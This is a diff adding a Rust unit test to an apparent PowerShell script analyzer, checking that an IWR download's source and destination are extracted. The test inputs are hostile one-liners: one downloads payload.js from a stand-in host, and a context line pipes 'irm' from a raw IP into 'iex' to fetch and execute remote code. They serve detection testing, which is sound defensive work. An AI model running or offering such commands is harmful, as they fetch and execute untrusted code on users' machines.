@@ -7588,6 +7588,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_outfile_abbreviation_preserves_destination() {
+        let ps = r#"IWR -useb https://iwr-outf.example/payload.js -outf C:\Temp\payload.js"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://iwr-outf.example/payload.js"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.js")
+            )
+        });
+        assert!(
+            has,
+            "IWR -outf destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn irm_schemeless_ip_url_extracted_as_download() {
         let ps = r#"iex(irm '91.92.34.126:6600' -UseBasicParsing)"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
